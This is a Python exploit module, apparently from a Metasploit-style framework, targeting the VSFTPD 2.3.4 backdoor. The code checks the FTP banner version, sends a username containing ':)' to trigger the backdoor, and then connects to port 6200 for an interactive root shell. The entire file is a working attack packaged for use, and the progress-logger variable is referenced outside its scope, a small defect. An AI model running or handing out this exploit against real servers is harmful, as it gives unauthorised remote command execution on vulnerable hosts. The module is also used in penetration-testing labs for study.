import time,socket,os
from pwn import *
from sys import exit
from time import sleep
from waf.libs.color  import *
from waf.libs import variable as var

var.all_var['rports']='21'
info = {
        "name"        : "vsftpd_234_backdoor",
        "title"       : "VSFTPD v2.3.4 Backdoor Command Execution",
        "module"      : "exploits/unix/ftp/vsftpd_234_backdoor ftp 2.3.4 vsftpd 2.3.4",
        "description" : """
 This module exploits a malicious backdoor that was added to the	VSFTPD download
 archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
 June 30th 2011 and July 1st 2011 according to the most recent information
 available. This backdoor was removed on July 3rd 2011.

        """
        }


options ={
  "RHOSTS" : [str(var.all_var['rhosts']),'The target host [21]'],
  "RPORTS" : [str(var.all_var['rports']),'The target port (TCP)']
}

def trigger_backdoor(ip,port):
		p.status("Checking Version...")
		io = remote(ip,port)
		io.recvuntil(b"vsFTPd ")
		version = (io.recvuntil(b")")[:-1]).decode()
		if version != "2.3.4":
			p.failure("Version 2.3.4 Not Found!!!")
		else:
			p.status("Triggering Backdoor....")
			io.sendline(b"USER hello:)")
			io.sendline(b"PASS hello123")
			io.close()
			get_shell(ip)

def get_shell(ip):
		p.status("Connecting To Backdoor...")
		sleep(1)
		io = remote(ip, 6200)
		p.success("Got Shell!!!")
		io.interactive()
		io.close()

def running():
    try:
       p = log.progress("")
       trigger_backdoor(var.all_var['rhosts'],var.all_var['rports'])
        
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
